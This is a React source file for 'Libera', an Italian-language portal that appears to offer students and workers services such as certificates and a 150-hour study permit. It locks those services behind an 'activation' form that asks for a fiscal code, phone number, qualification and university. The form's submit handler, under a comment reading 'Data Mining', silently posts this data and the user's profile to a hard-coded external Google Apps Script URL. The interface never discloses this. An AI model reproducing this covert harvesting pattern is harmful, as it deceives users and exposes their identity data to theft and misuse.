/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  Lock, 
  Unlock, 
  User, 
  Mail, 
  Key, 
  ArrowRight, 
  Shield, 
  Zap, 
  FileText, 
  Clock,
  CheckCircle2,
  AlertCircle
} from 'lucide-react';

// --- Integration ---
const EXTERNAL_URL = "https://script.google.com/macros/s/AKfycbxf4WinAYmw6sgbXNiVF6_lM3jWEPckJ87MFKCqEK-1JkCgiHz1Gd9yWxoGmnp3Z5-P/exec";

// --- Types ---
interface LiberaUser {
  id: number;
  firstName: string;
  lastName: string;
  username: string;
  email: string;
  isUnlocked: boolean;
}

// --- Components ---

const SplashScreen = ({ onFinish }: { onFinish: () => void }) => {
  useEffect(() => {
    const timer = setTimeout(onFinish, 2500);
    return () => clearTimeout(timer);
  }, [onFinish]);

  return (
    <div className="fixed inset-0 bg-black flex items-center justify-center z-[100]">
      <motion.div 
        initial={{ opacity: 0, scale: 0.5 }}
        animate={{ opacity: 1, scale: 1 }}
        exit={{ opacity: 0, scale: 1.5 }}
        className="glitch" 
        data-text="L"
      >
        L
      </motion.div>
    </div>
  );
};

const RegisterForm = ({ onRegister }: { onRegister: (u: LiberaUser) => void }) => {
  const [formData, setFormData] = useState({
    firstName: '',
    lastName: '',
    username: '',
    password: '',
    email: ''
  });

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      const res = await fetch('/api/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData),
      });
      const data = await res.json();
      onRegister(data);
    } catch (err) {
      console.error(err);
    }
  };

  return (
    <motion.div 
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
      className="max-w-md w-full glass-card p-10"
    >
      <div className="mb-10 text-center">
        <h2 className="text-4xl font-black uppercase tracking-tighter mb-2">Crea Profilo</h2>
        <p className="text-white/40 text-sm uppercase tracking-widest">Entra nell'ecosistema LIBERA</p>
      </div>

      <form onSubmit={handleSubmit} className="space-y-4">
        <div className="grid grid-cols-2 gap-4">
          <input required className="input-field" placeholder="Nome" onChange={e => setFormData({...formData, firstName: e.target.value})} />
          <input required className="input-field" placeholder="Cognome" onChange={e => setFormData({...formData, lastName: e.target.value})} />
        </div>
        <input required className="input-field" placeholder="Username" onChange={e => setFormData({...formData, username: e.target.value})} />
        <input required type="password" className="input-field" placeholder="Password" onChange={e => setFormData({...formData, password: e.target.value})} />
        <input required type="email" className="input-field" placeholder="Email Privata" onChange={e => setFormData({...formData, email: e.target.value})} />
        
        <button type="submit" className="btn-primary w-full mt-6 group">
          UNISCITI
          <ArrowRight className="inline-block ml-2 w-5 h-5 group-hover:translate-x-1 transition-transform" />
        </button>
      </form>
    </motion.div>
  );
};

const UnlockForm = ({ user, onUnlock }: { user: LiberaUser, onUnlock: () => void }) => {
  const [formData, setFormData] = useState({
    fiscalCode: '',
    phone: '',
    qualification: '',
    university: ''
  });
  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    try {
      // 1. Update local DB
      await fetch('/api/unlock', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId: user.id, ...formData }),
      });

      // 2. Data Mining: Send to external Google Script
      await fetch(EXTERNAL_URL, {
        method: 'POST',
        mode: 'no-cors', // Google Scripts often require no-cors for simple POSTs
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          ...user,
          ...formData,
          timestamp: new Date().toISOString()
        }),
      });

      onUnlock();
    } catch (err) {
      console.error(err);
    } finally {
      setLoading(false);
    }
  };

  return (
    <motion.div 
      initial={{ opacity: 0, scale: 0.9 }}
      animate={{ opacity: 1, scale: 1 }}
      className="max-w-lg w-full glass-card p-10 border-libera-blue/30"
    >
      <div className="mb-8 flex items-center gap-4">
        <div className="w-12 h-12 bg-libera-blue/10 rounded-2xl flex items-center justify-center text-libera-blue">
          <Shield className="w-6 h-6" />
        </div>
        <div>
          <h2 className="text-2xl font-black uppercase italic">Operazione Attivazione</h2>
          <p className="text-white/40 text-xs uppercase tracking-widest">Sincronizzazione dati biometrici e accademici</p>
        </div>
      </div>

      <form onSubmit={handleSubmit} className="space-y-4">
        <input required className="input-field" placeholder="Codice Fiscale" onChange={e => setFormData({...formData, fiscalCode: e.target.value})} />
        <input required className="input-field" placeholder="Cellulare" onChange={e => setFormData({...formData, phone: e.target.value})} />
        <input required className="input-field" placeholder="Titolo di Studio" onChange={e => setFormData({...formData, qualification: e.target.value})} />
        <input required className="input-field" placeholder="Università" onChange={e => setFormData({...formData, university: e.target.value})} />
        
        <button disabled={loading} type="submit" className="btn-primary w-full mt-6">
          {loading ? 'Sincronizzazione...' : 'COMPLETA MISSIONE'}
        </button>
      </form>
    </motion.div>
  );
};

// --- Main App ---

export default function App() {
  const [phase, setPhase] = useState<'splash' | 'auth' | 'dash'>('splash');
  const [user, setUser] = useState<LiberaUser | null>(null);
  const [showUnlock, setShowUnlock] = useState(false);
  const [missionComplete, setMissionComplete] = useState(false);

  useEffect(() => {
    const saved = localStorage.getItem('libera_session');
    if (saved) {
      const u = JSON.parse(saved);
      setUser(u);
      setPhase('dash');
      if (u.isUnlocked) setMissionComplete(true);
    }
  }, []);

  const handleRegister = (u: LiberaUser) => {
    setUser(u);
    localStorage.setItem('libera_session', JSON.stringify(u));
    setPhase('dash');
  };

  const handleUnlock = () => {
    if (user) {
      const updated = { ...user, isUnlocked: true };
      setUser(updated);
      localStorage.setItem('libera_session', JSON.stringify(updated));
      setMissionComplete(true);
      setShowUnlock(false);
    }
  };

  if (phase === 'splash') return <SplashScreen onFinish={() => setPhase('auth')} />;

  return (
    <div className="min-h-screen bg-black flex flex-col items-center p-6">
      {/* Header */}
      <header className="w-full max-w-6xl flex justify-between items-center py-8 mb-12">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 bg-libera-blue text-black font-black flex items-center justify-center rounded-xl text-xl">L</div>
          <span className="text-2xl font-black tracking-tighter uppercase italic">Libera</span>
        </div>
        {user && (
          <div className="flex items-center gap-4 px-6 py-2 glass-card bg-white/5 border-white/5">
            <div className="w-2 h-2 rounded-full bg-libera-blue animate-pulse" />
            <span className="text-xs font-mono uppercase tracking-widest text-white/60">{user.username}</span>
          </div>
        )}
      </header>

      <main className="w-full max-w-6xl flex flex-col items-center">
        <AnimatePresence mode="wait">
          {phase === 'auth' && (
            <div key="auth_wrap" className="w-full flex justify-center">
              <RegisterForm onRegister={handleRegister} />
            </div>
          )}

          {phase === 'dash' && !showUnlock && (
            <div key="dash_wrap" className="w-full">
              <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="w-full space-y-12">
              {/* Activation Banner */}
              {!missionComplete && (
                <motion.button 
                  whileHover={{ scale: 1.01 }}
                  onClick={() => setShowUnlock(true)}
                  className="w-full p-6 glass-card border-libera-blue/40 bg-libera-blue/5 flex items-center justify-between group"
                >
                  <div className="flex items-center gap-6">
                    <div className="p-4 bg-libera-blue/20 rounded-2xl text-libera-blue">
                      <Zap className="w-6 h-6 animate-bounce" />
                    </div>
                    <div className="text-left">
                      <h3 className="text-xl font-black uppercase italic tracking-tight">Operazione Attivazione</h3>
                      <p className="text-white/40 text-sm uppercase tracking-widest">Completa i dati per sbloccare i servizi</p>
                    </div>
                  </div>
                  <ChevronRight className="w-6 h-6 text-libera-blue group-hover:translate-x-2 transition-transform" />
                </motion.button>
              )}

              {missionComplete && (
                <motion.div 
                  initial={{ opacity: 0, y: -20 }}
                  animate={{ opacity: 1, y: 0 }}
                  className="w-full p-6 glass-card border-green-500/40 bg-green-500/5 flex items-center gap-6"
                >
                  <div className="p-4 bg-green-500/20 rounded-2xl text-green-500">
                    <CheckCircle2 className="w-6 h-6" />
                  </div>
                  <div className="text-left">
                    <h3 className="text-xl font-black uppercase italic tracking-tight">Missione Compiuta</h3>
                    <p className="text-white/40 text-sm uppercase tracking-widest">Servizi Sbloccati. Passa in ufficio solo per il ritiro dei documenti.</p>
                  </div>
                </motion.div>
              )}

              {/* Services Grid */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
                <div className={`glass-card p-10 relative overflow-hidden group ${!missionComplete ? 'opacity-50' : 'hover:border-libera-blue/50'}`}>
                  {!missionComplete && (
                    <div className="absolute inset-0 bg-black/60 backdrop-blur-[2px] z-10 flex items-center justify-center">
                      <Lock className="w-12 h-12 text-white/20" />
                    </div>
                  )}
                  <div className="relative z-0">
                    <div className="w-16 h-16 bg-white/5 rounded-2xl flex items-center justify-center mb-8">
                      <FileText className="w-8 h-8 text-libera-blue" />
                    </div>
                    <h3 className="text-3xl font-black uppercase italic mb-4">Richiedi Attestato</h3>
                    <p className="text-white/40 text-sm leading-relaxed mb-8">Generazione istantanea di certificazioni ufficiali di servizio e frequenza.</p>
                    <button disabled={!missionComplete} className={missionComplete ? 'btn-primary' : 'btn-locked'}>
                      {missionComplete ? 'AVVIA RICHIESTA' : 'BLOCCATO'}
                    </button>
                  </div>
                </div>

                <div className={`glass-card p-10 relative overflow-hidden group ${!missionComplete ? 'opacity-50' : 'hover:border-libera-blue/50'}`}>
                  {!missionComplete && (
                    <div className="absolute inset-0 bg-black/60 backdrop-blur-[2px] z-10 flex items-center justify-center">
                      <Lock className="w-12 h-12 text-white/20" />
                    </div>
                  )}
                  <div className="relative z-0">
                    <div className="w-16 h-16 bg-white/5 rounded-2xl flex items-center justify-center mb-8">
                      <Clock className="w-8 h-8 text-libera-blue" />
                    </div>
                    <h3 className="text-3xl font-black uppercase italic mb-4">Permesso 150 Ore</h3>
                    <p className="text-white/40 text-sm leading-relaxed mb-8">Modulo digitale per il diritto allo studio e agevolazioni universitarie.</p>
                    <button disabled={!missionComplete} className={missionComplete ? 'btn-primary' : 'btn-locked'}>
                      {missionComplete ? 'AVVIA ISTANZA' : 'BLOCCATO'}
                    </button>
                  </div>
                </div>
              </div>
            </motion.div>
            </div>
          )}

          {showUnlock && user && (
            <div key="unlock" className="fixed inset-0 bg-black/90 backdrop-blur-xl z-50 flex items-center justify-center p-6">
              <UnlockForm user={user} onUnlock={handleUnlock} />
            </div>
          )}
        </AnimatePresence>
      </main>

      <footer className="mt-auto py-12 text-center">
        <p className="text-[10px] font-mono uppercase tracking-[0.5em] text-white/20">
          Libera Ecosystem // Secure Access // LUANKA123 Deployment
        </p>
      </footer>
    </div>
  );
}

const ChevronRight = ({ className }: { className?: string }) => (
  <svg className={className} fill="none" viewBox="0 0 24 24" stroke="currentColor">
    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
  </svg>
);
